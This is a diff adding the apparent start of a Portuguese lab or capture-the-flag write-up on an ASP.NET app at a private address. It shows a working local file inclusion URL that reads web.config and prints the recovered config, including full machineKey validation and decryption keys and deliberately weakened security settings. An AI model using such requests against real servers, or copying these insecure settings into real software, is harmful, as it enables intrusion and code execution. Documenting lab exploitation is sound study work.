@@ -1,0 +1,27 @@
+#+title: Start
+#+Author:Gabriel
+
+* intro
+no endereço 10.5.2.10, tem uma aplicação ASP.NET vulnerável a LFI, permitindo a captura de uma validationKey
+
+http://10.5.2.10/network-reports.aspx?report=web.config
+
+#+begin_src xml
+<?xml version="1.0"?>
+<configuration>
+  <system.web>
+    <pages validateRequest="false" enableEventValidation="false" viewStateEncryptionMode="Never"/>
+    <machineKey validationKey="56AB7132992003EE87F74AE4D9675D65EED8018D3528C0B8874905B51940DEAF6B85F1D922D19AB8F69781B2326A2F978A064708822FD8C54ED74CADF8592E17" decryptionKey="A69D80B92A16DFE1698DFE86D4CED630FA56D7C1661C8D05744449889B88E8DC" validation="SHA1" decryption="AES"/>
+    <customErrors mode="Off"/>
+    <compilation defaultLanguage="c#" debug="true"/>
+    <!-- CRITICAL SETTING: Allows path traversal in URLs -->
+    <httpRuntime relaxedUrlToFileSystemMapping="true" />
+  </system.web>
+
+  <system.webServer>
+    <staticContent>
+      <mimeMap fileExtension=".config" mimeType="text/plain" />
+    </staticContent>
+  </system.webServer>
+</configuration>
+#+end_src
